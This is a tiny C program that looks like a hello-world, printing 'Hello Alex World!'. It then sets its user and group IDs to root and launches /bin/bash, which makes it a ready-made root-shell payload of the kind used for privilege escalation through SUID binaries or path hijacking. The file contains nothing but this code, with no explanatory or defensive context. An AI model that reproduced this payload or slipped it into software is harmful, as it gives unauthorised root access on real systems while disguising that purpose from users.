main(){
	printf("Hello Alex World!\n");
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
